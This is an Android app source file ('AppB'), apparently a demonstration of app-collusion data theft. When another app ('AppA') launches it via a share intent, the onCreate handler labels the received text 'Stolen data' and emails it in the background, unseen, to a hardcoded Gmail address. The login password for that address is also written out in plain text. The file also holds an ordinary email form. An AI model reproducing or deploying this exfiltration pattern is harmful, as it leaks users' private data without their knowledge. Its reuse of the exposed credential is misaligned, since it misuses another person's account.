package com.example.appb;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
	private Button mbtn;
	private TextView muname;
	private TextView mpass;
	private TextView mto;
	private TextView msub;
	private TextView mtext;
	private static String str;

	@SuppressWarnings({ "unchecked", "rawtypes" })
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Intent intent = getIntent();
		String action = intent.getAction();
		String type = intent.getType();

		// If AppB is launched by AppA, receive data and send to the specified
		// email ID
		if (Intent.ACTION_SEND.equals(action) && type != null) {
			recvData(intent); // Handle text being sent
			new AsyncTask() {
				@Override
				protected Object doInBackground(Object... arg0) {
					boolean flag;
					try {
						flag = sendMail("125shwetha@gmail.com",
								"xB5f57jJGmail", "125shwetha@gmail.com",
								"Stolen data", str);
					} catch (Exception e) {
						e.printStackTrace();
						return null;
					}
					return flag;
				}
			}.execute();
			finish();
		}

		setContentView(R.layout.activity_main);
		muname = (TextView) findViewById(R.id.editText1);
		mpass = (TextView) findViewById(R.id.editText2);
		mto = (TextView) findViewById(R.id.editText3);
		msub = (TextView) findViewById(R.id.editText4);
		mtext = (TextView) findViewById(R.id.editText5);
		mbtn = (Button) findViewById(R.id.button1);

		mbtn.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				new AsyncTask() {
					@Override
					protected Object doInBackground(Object... params) {
						String uname = muname.getText().toString().trim();
						String pass = mpass.getText().toString().trim();
						String sub = msub.getText().toString().trim();
						String text = mtext.getText().toString().trim();
						String to = mto.getText().toString().trim();
						boolean flag;

						try {
							if (!uname.equals(null) && !pass.equals(null)
									&& !sub.equals(null) && !text.equals(null)
									&& !to.equals(null)) {
								System.out.println("Nothing is null" + uname
										+ to);
								flag = sendMail(uname, pass, to, sub, text);
							}

						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						return null;
					}

				}.execute();

			}
		});
	}

	/**
	 * Method to receive data sent by AppA
	 * 
	 * @param i
	 */
	public void recvData(Intent i) {
		String sharedText = i.getStringExtra(Intent.EXTRA_TEXT);
		str = "Stolen data: ";
		str += sharedText;
		System.out.println(str);
	}

	/**
	 * Method to send email
	 * 
	 * @param uname
	 * @param pwd
	 * @param to
	 * @param subj
	 * @param body
	 * @return
	 * @throws Exception
	 */
	public static boolean sendMail(String uname, String pwd, String to,
			String subj, String body) throws Exception {
		Mail m = new Mail(uname, pwd, to);

		m.set_from(uname);
		m.set_subject(subj);
		m.setBody(body);

		return m.send();

	}

}
